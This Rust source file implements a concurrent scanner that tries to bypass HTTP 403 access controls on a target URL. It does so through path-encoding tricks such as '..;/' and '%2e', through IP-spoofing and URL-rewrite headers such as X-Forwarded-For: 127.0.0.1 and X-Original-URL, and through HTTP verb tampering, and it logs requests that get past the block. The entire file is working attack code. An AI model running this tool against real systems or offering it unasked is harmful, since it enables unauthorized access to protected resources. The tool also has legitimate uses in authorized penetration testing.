use futures::{stream, StreamExt};
use http::Method;
use log::{error, info};

use reqwest::{Client, RequestBuilder, Url};
use std::collections::HashMap;

pub struct Bypass {
    base: String,
    path: String,
    client: reqwest::Client,
    content_length: u64,
}

impl Bypass {
    pub fn new(base: String, path: String, content_length: u64) -> Bypass {
        Bypass {
            base,
            path,
            client: Client::new(),
            content_length,
        }
    }

    fn paths(&self) -> Vec<String> {
        return vec![
            format!("%2e{}", &self.path),
            format!("{}/.", &self.path),
            format!("{}?", &self.path),
            format!("{}??", &self.path),
            format!("{}//", &self.path),
            format!("{}/./", &self.path),
            format!("{}/", &self.path),
            format!("{}.random-string", &self.path),
            format!("{}..;/", &self.path),
            format!("{}%09", &self.path),
            format!("{}%20", &self.path),
            format!("{}.html", &self.path),
            format!("{}#", &self.path),
        ];
    }

    fn headers(&self) -> HashMap<&'static str, &'static str> {
        return [
            ("Referer", "{URL}"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Original-URL", "/{PATH}"),
            ("X-Rewrite-URL", "{PATH}"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Host", "127.0.0.1"),
            ("X-Forwarded-Host", "127.0.0.1"),
        ]
        .iter()
        .cloned()
        .collect();
    }

    fn verbs(&self) -> Vec<http::Method> {
        return vec![
            Method::GET,
            Method::POST,
            Method::PATCH,
            Method::PUT,
            Method::OPTIONS,
            Method::HEAD,
            Method::TRACE,
            Method::CONNECT,
        ];
    }

    fn using_different_verbs(&self) -> Vec<RequestBuilder> {
        return self
            .verbs()
            .iter()
            .map(|p| {
                self.client
                    .request(p.clone(), self.url().join(&self.path).unwrap())
            })
            .collect();
    }

    fn using_different_headers(&self) -> Vec<RequestBuilder> {
        let url = self.url().join(&self.path).unwrap();
        return self
            .headers()
            .into_iter()
            .map(|e| (e.0, e.1.replace("{URL}", &url.to_string())))
            .map(|e| (e.0, e.1.replace("{PATH}", &self.path)))
            .map(|e| self.client.get(url.clone()).header(e.0, e.1.clone()))
            .collect();
    }

    fn using_different_paths(&self) -> Vec<RequestBuilder> {
        self.paths()
            .into_iter()
            .map(|path| self.url().join(&path))
            .map(|p| self.client.get(p.unwrap()))
            .collect()
    }

    fn url(&self) -> Url {
        Url::parse(&self.base).unwrap()
    }

    pub async fn scan(&self) {
        let mut requests = self.using_different_verbs();
        requests.extend(self.using_different_headers());
        requests.extend(self.using_different_paths());

        let resp = stream::iter(requests)
            .map(|r| async move {
                let keep = r.try_clone();
                let resp = r.send().await;
                (keep.unwrap(), resp)
            })
            .buffer_unordered(10);

        resp.for_each(|r| async {
            match r.1 {
                Ok(resp) => {
                    if resp.status().is_success() && self.content_length != 0 {
                        if resp
                            .content_length()
                            .filter(|cl| cl == &self.content_length)
                            .is_some()
                        {
                            return;
                        }
                        info!("Got past forbidden with req: {:#?}", r.0); // TODO:
                    }
                }
                Err(e) => error!("Error: {:#?}", e),
            }
        })
        .await;
    }
}
